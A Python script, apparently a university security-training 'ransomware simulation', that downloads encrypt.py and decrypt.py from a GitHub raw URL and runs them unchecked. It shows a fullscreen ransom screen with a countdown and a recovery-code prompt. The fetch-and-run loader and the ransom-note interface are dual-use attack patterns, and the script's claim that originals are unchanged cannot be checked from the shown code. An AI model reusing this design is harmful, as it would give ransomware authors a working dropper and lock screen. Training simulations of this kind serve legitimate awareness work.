from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import HTTPError
from datetime import datetime, timedelta
import subprocess
import sys
import time
import tkinter as tk

base = Path.home() / "Desktop" / "RansomDemo"
raw = "https://raw.githubusercontent.com/what0302/what0302.github.io/master/_posts/"
base.mkdir(parents=True, exist_ok=True)


def download(name, destination):
    request = Request(raw + name + "?t=" + str(time.time_ns()), headers={"User-Agent": "UNT-Training-Lab"})
    destination.parent.mkdir(parents=True, exist_ok=True)
    try:
        destination.write_bytes(urlopen(request, timeout=15).read())
    except HTTPError as error:
        raise RuntimeError(f"GitHub download failed ({error.code}): {name}") from error
    return destination


def run_code(name):
    script = download(name, base / ".runtime" / name)
    return subprocess.run([sys.executable, str(script)], text=True, capture_output=True)


try:
    result = run_code("encrypt.py")
    print(result.stdout, result.stderr)
    worked = result.returncode == 0
    detail = (result.stderr or result.stdout).strip()[-120:]
except Exception as error:
    worked = False
    detail = str(error)

root = tk.Tk()
root.title("UNT Security Lab")
root.configure(bg="#8b0000")
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.attributes("-fullscreen", True)
root.bind("<Escape>", lambda event: root.destroy())
small = width < 750
main = tk.Frame(root, bg="#8b0000")
main.pack(expand=True, padx=18, pady=12)

try:
    from PIL import Image, ImageTk
    imagefile = download("unt_mascot.png", base / ".runtime" / "unt_mascot.png")
    image = Image.open(imagefile).convert("RGBA")
    image.thumbnail((140 if small else 220, 210 if small else 330))
    photo = ImageTk.PhotoImage(image)
    left = tk.Label(main, image=photo, bg="#8b0000")
    left.image = photo
    left.pack(side="left", padx=(4, 18))
except Exception as error:
    print("Mascot:", error)

right = tk.Frame(main, bg="#8b0000")
right.pack(side="left", fill="both", expand=True)


def label(message, size=14, color="white"):
    item = tk.Label(right, text=message, bg="#8b0000", fg=color,
                    font=("Arial", size, "bold"), wraplength=max(280, width - (210 if small else 300)), justify="center")
    item.pack(pady=5)
    return item

label("RANSOMWARE SIMULATION", 20 if small else 30)
label("ENCRYPTED PDF COPIES CREATED" if worked else "ENCRYPTION FAILED", 12 if small else 17, "#ffe600")
label("THIS IS A TEST. ORIGINAL FILES ARE UNCHANGED.", 10)
clock = tk.Label(right, text="00:30:00", bg="#171717", fg="#ffe600",
                 font=("Courier", 27 if small else 39, "bold"), padx=16, pady=8)
clock.pack(pady=10)
end = datetime.now() + timedelta(minutes=30)


def tick():
    seconds = max(0, int((end - datetime.now()).total_seconds()))
    clock.config(text=f"{seconds//3600:02}:{seconds//60%60:02}:{seconds%60:02}")
    if seconds:
        root.after(1000, tick)


tick()


def open_files():
    path = base / "critical_tk0667"
    if path.is_dir():
        root.attributes("-topmost", False)
        subprocess.Popen(["xdg-open", str(path)])


tk.Button(right, text="VIEW ENCRYPTED FILES", command=open_files, padx=16, pady=6).pack(pady=8)
label("RECOVERY CODE", 12)
code = tk.Entry(right, width=13, font=("Arial", 19), justify="center", show="*")
code.pack(pady=4)
status = label("" if worked else detail[:95], 10, "#ffe600")


def recover():
    entered = code.get().strip()
    if len(entered) != 4 or not entered.isdigit():
        status.config(text="ENTER A 4-DIGIT CODE")
        return
    try:
        request = Request(
            raw + "recovery_code.txt?t=" + str(time.time_ns()),
            headers={"Cache-Control": "no-cache"}
        )
        expected = urlopen(request, timeout=10).read().decode("utf-8").strip()
        if entered != expected:
            status.config(text="INVALID RECOVERY CODE")
            return
        status.config(text="DOWNLOADING RECOVERY FILES...")
        root.update_idletasks()
        download("recovery_private.pem", base / ".runtime" / "recovery_private.pem")
        result = run_code("decrypt.py")
        print(result.stdout, result.stderr)
        if result.returncode:
            status.config(text="RECOVERY FAILED - CHECK TERMINAL")
        else:
            status.config(text="DECRYPTED / VERIFIED - SHA256 OK")
            subprocess.Popen(["xdg-open", str(base / "critical_tk0667")])
    except Exception as error:
        status.config(text=str(error)[:120])
        print("Recovery error:", error)


button = tk.Button(right, text="RECOVER FILES", command=recover, padx=16, pady=7)
button.pack(pady=8)
code.bind("<Return>", lambda event: recover())
if not worked:
    button.config(state="disabled")
label("SIMULATION ONLY  •  ESC = Exit", 10)
root.mainloop()
